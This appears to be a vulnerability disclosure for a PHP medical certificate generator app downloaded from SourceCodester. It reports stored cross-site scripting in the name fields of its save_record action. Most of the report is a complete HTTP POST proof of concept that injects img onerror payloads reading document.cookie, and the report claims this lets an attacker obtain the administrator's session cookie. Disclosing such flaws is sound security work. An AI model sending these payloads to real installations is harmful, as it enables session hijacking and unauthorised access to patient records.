## Medical Certificate Generator App has xss


## supplier
https://www.sourcecodester.com/php/16105/medical-certificate-generator-app-using-php-and-mysql-free-download.html

## Vulnerability file
/php-med-cert-generator/action.php?action=save_record


## describe
Medical certificate generator app that allows unlimited xss attacks. An attacker could exploit this vulnerability to directly obtain the administrator cookie without authorization.

POC

The lastname, firstname, and middlename parameters all have stored XSS vulnerabilities.
```
POST /php-med-cert-generator/action.php?action=save_record HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 477
Origin: http://localhost
Connection: close
Referer: http://localhost/php-med-cert-generator/?page=manage_record&id=1
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=1&lastname=%3Cimg+src%3D1+onerror%3Dalert(document.cookie)%3E&firstname=%3Cimg+src%3D1+onerror%3Dalert(document.cookie)%3E&middlename=%3Cimg+src%3D1+onerror%3Dalert(document.cookie)%3E&suffix=Jr.&dob=1997-06-23&gender=Male&civil_status=Married&contact=09123654789&nationality=Filipino&address=Sample+Address&diagnostic=Flu&remarks=is+advising+the+above+individual+should+take+at+least+3-4+days+to+fully+recover+from+his+illness.&doctor_fullname=Claire+Blake&doctor_suffix=MD

```
<img width="1286" alt="image" src="https://github.com/user-attachments/assets/4c455e4d-7e32-4d89-9226-76bba059b363">


<img width="1531" alt="image" src="https://github.com/user-attachments/assets/80764409-a22f-4766-b27d-a1ffc4298829">







